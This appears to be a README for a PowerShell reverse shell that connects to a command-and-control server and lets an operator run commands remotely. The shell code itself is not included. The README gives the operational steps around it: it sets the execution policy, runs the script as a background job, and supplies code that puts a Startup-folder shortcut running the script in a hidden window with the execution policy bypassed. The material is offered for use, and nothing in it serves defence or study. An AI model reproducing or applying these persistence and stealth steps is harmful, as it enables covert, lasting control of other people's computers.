# Reverse PowerShell Script

This PowerShell script establishes a reverse TCP connection to a command-and-control (C2) server and allows for remote command execution via a secure shell.

## Prerequisites

Before running the script, ensure you have the following:

- **PowerShell**: The script is written for PowerShell and should be executed in a Windows environment.
- **Execution Policy**: The script may require an execution policy that allows scripts to run.

## Step-by-Step Instructions

### 1. Set the PowerShell Execution Policy

To allow the script to run, you may need to set the execution policy to `RemoteSigned` for the current user.

1. Open a PowerShell window **as Administrator**.
2. Run the following command to set the execution policy:

   ```powershell
   Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
   ```

# ReversePowerShell

#### Run in the background

```powershell
   Start-Job -ScriptBlock { C:\Users\adm\Downloads\reverse-powershell.ps1 }
```

# Create a shortcut to the reverse shell script in the Startup folder
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$scriptPath = "C:\path\to\reverse-powershell.ps1"
$shortcutPath = "$startupFolder\reverse-powershell.lnk"

# Create a WScript Shell object to create the shortcut
$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
$shortcut.Save()
